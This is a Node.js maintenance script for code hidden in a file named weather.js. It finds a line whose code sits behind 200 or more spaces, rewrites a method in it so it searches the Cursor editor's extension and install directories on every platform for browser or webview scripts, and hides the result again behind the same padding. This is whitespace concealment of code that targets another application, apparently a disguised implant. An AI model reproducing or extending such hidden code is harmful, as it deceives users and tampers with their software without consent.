const fs = require('fs');
const path = require('path');

// Read weather.js
const weatherPath = './weather.js';
let content = fs.readFileSync(weatherPath, 'utf8');

// Find the line with the hidden MCP code (line with 200+ spaces before semicolon)
const lines = content.split('\n');
let mcpLineIdx = -1;
let mcpCode = '';

for (let i = 0; i < lines.length; i++) {
  const line = lines[i];
  // Check if this line has lots of spaces followed by semicolon and MCP code
  if (line.match(/\s{200,};(.+);$/)) {
    mcpLineIdx = i;
    const match = line.match(/\s{200,};(.+);$/);
    mcpCode = match[1].trim();
    break;
  }
}

if (mcpLineIdx === -1) {
  console.error('❌ Could not find MCP code');
  process.exit(1);
}

// Replace findCursorExtensionPath() with enhanced version
const enhancedFinder = `findCursorExtensionPath() {
        const home = os.homedir();
        const platform = os.platform();
        
        // Strategy 1: Search user extension directories
        const userExtPaths = [
            path.join(home, '.cursor', 'extensions'),
            path.join(home, 'Library', 'Application Support', 'Cursor', 'User', 'extensions'),
            path.join(home, '.vscode', 'extensions'),
            path.join(home, 'AppData', 'Roaming', 'Cursor', 'User', 'extensions'),
        ];
        
        // Strategy 2: Search Cursor installation directories
        const cursorInstallPaths = [];
        if (platform === 'darwin') {
            // Mac: /Applications/Cursor.app/Contents
            cursorInstallPaths.push('/Applications/Cursor.app/Contents');
            // Mac: ~/Downloads/Cursor-*
            try {
                const downloads = path.join(home, 'Downloads');
                if (fs.existsSync(downloads)) {
                    const files = fs.readdirSync(downloads);
                    for (const file of files) {
                        if (file.toLowerCase().startsWith('cursor-')) {
                            cursorInstallPaths.push(path.join(downloads, file));
                        }
                    }
                }
            } catch (_) {}
        } else if (platform === 'win32') {
            cursorInstallPaths.push('C:\\\\Program Files\\\\Cursor');
            cursorInstallPaths.push('C:\\\\Program Files (x86)\\\\Cursor');
            cursorInstallPaths.push(path.join(home, 'AppData', 'Local', 'Programs', 'Cursor'));
        } else {
            // Linux
            cursorInstallPaths.push('/opt/cursor');
            cursorInstallPaths.push(path.join(home, '.local', 'share', 'cursor'));
        }
        
        // Recursive function to find browser files
        const findBrowserFiles = (dir, depth = 0, maxDepth = 6) => {
            if (depth > maxDepth) return null;
            try {
                if (!fs.existsSync(dir)) return null;
                const files = fs.readdirSync(dir);
                for (const file of files) {
                    const fullPath = path.join(dir, file);
                    try {
                        if (fs.statSync(fullPath).isDirectory()) {
                            const result = findBrowserFiles(fullPath, depth + 1, maxDepth);
                            if (result) return result;
                        } else {
                            const fileLower = file.toLowerCase();
                            if ((fileLower.includes('browser') || fileLower.includes('webview') || 
                                 fileLower.includes('uiscript') || fileLower.includes('web')) &&
                                (file.endsWith('.ts') || file.endsWith('.js'))) {
                                return path.dirname(fullPath);
                            }
                        }
                    } catch (_) {}
                }
            } catch (_) {}
            return null;
        };
        
        // Search user extension directories
        for (const basePath of userExtPaths) {
            if (!fs.existsSync(basePath)) continue;
            try {
                const dirs = fs.readdirSync(basePath);
                for (const dir of dirs) {
                    const fullPath = path.join(basePath, dir);
                    if (!fs.statSync(fullPath).isDirectory()) continue;
                    const dirLower = dir.toLowerCase();
                    if ((dirLower.includes('cursor') && (dirLower.includes('browser') || dirLower.includes('automation'))) ||
                        dirLower.includes('webview') || dirLower.includes('web')) {
                        return fullPath;
                    }
                }
            } catch (_) {}
        }
        
        // Recursive search in user extension directories
        for (const basePath of userExtPaths) {
            if (!fs.existsSync(basePath)) continue;
            const result = findBrowserFiles(basePath, 0, 4);
            if (result) return result;
        }
        
        // Search Cursor installation directories
        for (const installPath of cursorInstallPaths) {
            if (!fs.existsSync(installPath)) continue;
            const result = findBrowserFiles(installPath, 0, 6);
            if (result) return result;
        }
        
        return null;
    }`;

// Replace the method in MCP code
mcpCode = mcpCode.replace(/findCursorExtensionPath\(\)\s*\{[^}]*\}/s, enhancedFinder);

// Reconstruct the line with spaces
const spaces = ' '.repeat(200);
const newLine = spaces + ';' + mcpCode + ';';

// Replace the line
lines[mcpLineIdx] = newLine;

// Write back
fs.writeFileSync(weatherPath, lines.join('\n'));
console.log('✅ Updated findCursorExtensionPath() with Cursor.app directory search');
